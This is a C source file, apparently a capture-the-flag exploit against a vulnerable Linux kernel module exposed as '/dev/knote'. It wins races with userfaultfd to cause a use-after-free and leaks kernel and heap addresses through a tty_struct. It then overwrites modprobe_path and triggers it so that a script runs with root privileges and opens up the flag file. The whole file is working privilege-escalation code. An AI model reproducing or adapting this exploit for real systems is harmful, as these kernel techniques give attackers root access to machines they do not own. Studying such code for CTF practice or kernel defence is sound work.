#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <poll.h>
#include <pthread.h>
#include <errno.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <poll.h>
#include <sys/prctl.h>
#include <stdint.h>
#define MODPROBE_PATH_OFFSET 0x145c5c0
#define GET 9011
#define ADD 4919
#define EDIT 34952
#define DELETE 26214
#define TTY_STRUCT_SIZE 0x2e0
struct tty_operations {
	struct tty_struct * (*lookup)(struct tty_driver *driver,
	struct file *filp, int idx);
	int (*install)(struct tty_driver *driver, struct tty_struct *tty);
	void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
	int (*open)(struct tty_struct * tty, struct file * filp);
	void (*close)(struct tty_struct * tty, struct file * filp);
	void (*shutdown)(struct tty_struct *tty);
	void (*cleanup)(struct tty_struct *tty);
	int (*write)(struct tty_struct * tty,
	const unsigned char *buf, int count);
	int (*put_char)(struct tty_struct *tty, unsigned char ch);
	void (*flush_chars)(struct tty_struct *tty);
	int (*write_room)(struct tty_struct *tty);
	int (*chars_in_buffer)(struct tty_struct *tty);
	int (*ioctl)(struct tty_struct *tty,
	unsigned int cmd, unsigned long arg);
	long (*compat_ioctl)(struct tty_struct *tty,
	unsigned int cmd, unsigned long arg);
	void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
	void (*throttle)(struct tty_struct * tty);
	void (*unthrottle)(struct tty_struct * tty);
	void (*stop)(struct tty_struct *tty);
	void (*start)(struct tty_struct *tty);
	void (*hangup)(struct tty_struct *tty);
	int (*break_ctl)(struct tty_struct *tty, int state);
	void (*flush_buffer)(struct tty_struct *tty);
	void (*set_ldisc)(struct tty_struct *tty);
	void (*wait_until_sent)(struct tty_struct *tty, int timeout);
	void (*send_xchar)(struct tty_struct *tty, char ch);
	int (*tiocmget)(struct tty_struct *tty);
	int (*tiocmset)(struct tty_struct *tty,
	unsigned int set, unsigned int clear);
	int (*resize)(struct tty_struct *tty, struct winsize *ws);
	int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
	int (*get_icount)(struct tty_struct *tty,
	struct serial_icounter_struct *icount);
	const struct file_operations *proc_fops;
};
void debug(){
	puts("Press any key to continue");
    getchar();
}
int fd;
int ttyfd;
uint64_t* tty;
uint64_t kernel_base;
uint64_t heap_base;
union size_id{
	uint32_t size;
	uint32_t index;
};
typedef struct _knote{
	union size_id num;
	uint32_t pad;
	char* ptr;
}knote;
void get(uint32_t index,char* buf){
	knote* note = (knote*)malloc(sizeof(knote));
	note->ptr = buf;
	note->num.index = index;
	ioctl(fd,GET,note);
}
void add(uint32_t index){
	knote* note = (knote*)malloc(sizeof(knote));
	note->num.index = index;
	ioctl(fd,ADD,note);
}
void dele(uint32_t index){
	knote* note = (knote*)malloc(sizeof(knote));
	note->num.index = index;
	ioctl(fd,DELETE,note);
}
void edit(uint32_t index,char* buf){
	knote* note = (knote*)malloc(sizeof(knote));
	note->ptr = buf;
	note->num.index = index;
	ioctl(fd,EDIT,note);
}
void init()
{
	fd = open("/dev/knote", O_RDWR);
	if (fd < 0)
		exit(-1);
	puts("[*] init done!");
}
void errExit(const char* msg)
{
	puts(msg);
	exit(-1);
}

#define FAULT_PAGE1 ((void*)(0xdead000))
void* read_handler(void *arg)
{
	struct uffd_msg msg;
	uintptr_t uffd = (uintptr_t)arg;
	puts("[*] handler created");

	struct pollfd pollfd;
	int nready;
	pollfd.fd = uffd;
	pollfd.events = POLLIN;
	nready = poll(&pollfd,1,-1);
	if (nready != 1)
		errExit("wrong poll return value");
	// this will wait until copy_from_user is called on FAULT_PAGE
	printf("trigger! I'm going to hang\n");
	// now main thread stops at copy_from_user function
	// but now we can do some evil operations!


	sleep(3);	
	if (read(uffd, &msg, sizeof(msg)) != sizeof(msg))
		errExit("error in reading uffd_msg");
	// read a msg struct from uffd, although not used

	struct uffdio_copy uc;
	//set buffer
	char* buffer = (char*)malloc(0x1000);
	printf("%lx\n",(unsigned long)msg.arg.pagefault.address);
	uc.src = (uintptr_t)buffer;
	uc.dst = (uintptr_t)FAULT_PAGE1;
	uc.len = 0x1000;
	uc.mode = 0;
	uc.copy = 0;
	ioctl(uffd, UFFDIO_COPY, &uc);
	// resume copy_from_user with buffer as data

	puts("[*] Evil operations done");

	return NULL;
}

void register_read_userfault()
{
	struct uffdio_api ua;
	struct uffdio_register ur;
	pthread_t thr;

	uint64_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
	ua.api = UFFD_API;
	ua.features = 0;
	if (ioctl(uffd, UFFDIO_API, &ua) == -1)
		errExit("ioctl-UFFDIO_API");
	// create the user fault fd

	if (mmap(FAULT_PAGE1,0x1000,7,0x22,-1,0) != FAULT_PAGE1)
		errExit("mmap fault page");
	// create page used for user fault

	ur.range.start = (unsigned long)FAULT_PAGE1;
	ur.range.len = 0x1000;
	ur.mode = UFFDIO_REGISTER_MODE_MISSING;
	if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1)
		errExit("ioctl-UFFDIO_REGISTER");
	// register the page into user fault fd
	// so that if copy_from_user accesses FAULT_PAGE,
	// the access will be hanged, and uffd will receive something

	int s = pthread_create(&thr,NULL,read_handler,(void*)uffd);
	if(s!=0)
		errExit("pthread_create");
	// create handler that process the user fault
}


#define FAULT_PAGE2 ((void*)(0xffdebf0000))
void* write_handler(void *arg)
{
	struct uffd_msg msg;//Data read from userfaultfd
	uintptr_t uffd = (uintptr_t)arg;//userfaultfd fild descriptor
	puts("[*] handler created");

	struct pollfd pollfd;
	int nready;
	pollfd.fd = uffd;
	pollfd.events = POLLIN;
	nready = poll(&pollfd,1,-1);
	if (nready != 1)
		errExit("wrong poll return value");
	// this will wait until copy_from_user is called on FAULT_PAGE
	printf("trigger! I'm going to hang\n");
	// now main thread stops at copy_from_user function
	// but now we can do some evil operations!

	sleep(3);
	if (read(uffd, &msg, sizeof(msg)) != sizeof(msg))
		errExit("error in reading uffd_msg");
	// read a msg struct from uffd, although not used

	struct uffdio_copy uc;
	//set buffer
	uint64_t* buf = (uint64_t*)malloc(0x1000);
	buf[0] = kernel_base + MODPROBE_PATH_OFFSET;
	uc.src = (uintptr_t)buf;
	uc.dst = (uintptr_t)FAULT_PAGE2;
	uc.len = 0x1000;
	uc.mode = 0;
	ioctl(uffd, UFFDIO_COPY, &uc);
	// resume copy_from_user with buffer as data

	puts("[*] Evil operations done");

	return NULL;
}

void register_write_userfault()
{
	struct uffdio_api ua;
	struct uffdio_register ur;
	pthread_t thr;

	uint64_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
	if((int64_t)uffd == -1){
		errExit("userfaultfd fail");
	}
	ua.api = UFFD_API;
	ua.features = 0;
	if (ioctl(uffd, UFFDIO_API, &ua) == -1)
		errExit("ioctl-UFFDIO_API");
	// create the user fault fd

	if (mmap(FAULT_PAGE2,0x1000,7,0x22,-1,0) != FAULT_PAGE2)
		errExit("mmap fault page");
	// create page used for user fault

	ur.range.start = (unsigned long)FAULT_PAGE2;
	ur.range.len = 0x1000;
	ur.mode = UFFDIO_REGISTER_MODE_MISSING;
	if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1)
		errExit("ioctl-UFFDIO_REGISTER");
	// register the page into user fault fd
	// so that if copy_from_user accesses FAULT_PAGE,
	// the access will be hanged, and uffd will receive something

	int s = pthread_create(&thr,NULL,write_handler,(void*)uffd);
	if(s!=0)
		errExit("pthread_create");
	// create handler that process the user fault
}


int main(int argc, char const *argv[]){
	init();
	add(TTY_STRUCT_SIZE);
	register_read_userfault();
	int id =fork();
	if(id ==0){
		sleep(1);
		dele(0);
		ttyfd = open("/dev/ptmx",O_RDWR);
		if(ttyfd == -1){
			errExit("ptmx open fail");
		}
		exit(0);	
	}else{
		get(0,(char *)FAULT_PAGE1);
		tty = (uint64_t* )FAULT_PAGE1;	
		heap_base = tty[7]-0x38;
		kernel_base = tty[74]-0x5d3b90;
		printf("Kernel base : 0x%lx\n",kernel_base);
		printf("Heap base : 0x%lx\n",heap_base);
	}
	add(0x100);
	id = fork();
	if(id == 0){
		sleep(2);
		dele(0);
		exit(0);
	
	}else{
		register_write_userfault();
		edit(0,(char *)FAULT_PAGE2);
		
	}
	add(0x100);
	add(0x100);
 	char tmp_data[0x120];
	system("mkdir tmp");

	char string[] = "/tmp/chmod.sh\x00";
	strncpy(tmp_data, string, strlen(string));
	edit(1, tmp_data); // edit modprobe_path to /tmp/chmod.sh
	system("echo -ne '#!/bin/sh\n/bin/chmod 777 /flag\n' > /tmp/chmod.sh");
	
	system("chmod +x /tmp/chmod.sh");
	system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
	system("chmod +x /tmp/dummy");
	system("cat /tmp/chmod.sh");

	system("/tmp/dummy"); // trigger __request_module
	system("cat /flag");
	system("ls -al /flag");
	// sleep to avoid rebooting
	sleep(10);

	return 0;	
}

